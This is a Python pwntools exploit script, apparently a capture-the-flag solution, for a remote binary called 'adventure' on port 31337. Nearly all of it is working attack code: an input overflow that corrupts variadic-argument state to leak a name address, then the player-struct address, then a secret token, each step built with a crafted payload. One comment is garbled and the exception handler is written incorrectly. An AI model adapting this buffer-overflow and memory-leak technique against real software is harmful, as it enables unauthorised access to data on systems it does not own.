from pwn import *
import IPython

DEBUG = False

p = None

def exploit():
    if DEBUG:
        p = gdb.debug('./adventure', '''
        break main
        break menuPrompt
        ''')
    else:
        # p = process("./adventure")
        p = remote("exploit.us", 31337)

    # IPython.embed()

    # First, overwrite gp_offset so varg will begin reading at overflow_arg_area instead of reg_save_area
    p.sendline(b"help"+b"A"*12)

    p.recvuntil(b"Action: \n")  # Consume everything printed so far

    p.recvline()  # Skip the first address

    addressRaw = p.recvline()  # The corrupted varg prints the address of the player name now

    addressStr = addressRaw[0:len(addressRaw)-1]  # Get rid of new line

    addressStr = addressStr + b"\x00" * (8 - len(addressStr))  # Add any missing leading zeroes for unpacking

    address = u64(addressStr)  # Unpack address so we can perform calculations

    print(f"Got leaked address (of player name) as 0x{address:x}")

    # IPython.embed()

    payload = b"help" + b'A' * (6 + 4 + 4)
    payload += p64(address + -80)
    payload += p64(address + -40)
    payload += p32(0x01)

    p.sendline(payload)  # Send the payload

    p.recvuntil(b"Action: \n")  # Consume everything printed so far

    playerRaw = p.recvline()  # The corrupted varg now pess of the player struct

    playerStr = playerRaw[0:len(playerRaw)-1]  # Get rid of new line

    playerStr = playerStr + b"\x00" * (8 - len(playerStr))  # Add any missing leading zeroes for unpacking

    playerAddress = u64(playerStr)  # Unpack address so we can perform calculations
    
    print(f"Got leaked address (of player struct) as 0x{playerAddress:x}")

    # IPython.embed()

    payload = b"help" + b'A' * (6 + 4 + 4)
    payload += p64(address + -80)
    payload += p64(playerAddress + -360)
    payload += p32(0x01)

    p.sendline(payload)  # Send the payload

    p.recvuntil(b"Action: \n")  # Consume everything printed so far

    print(b"Token is " +  p.recvline())

    p.sendline(b"run")  # Gracefully end the program

try:
    exploit()
except struct.error or EOFError:
    print("Randomly generated address contained an 0x00 and could not be extracted.\nRunning again.")
    exploit()
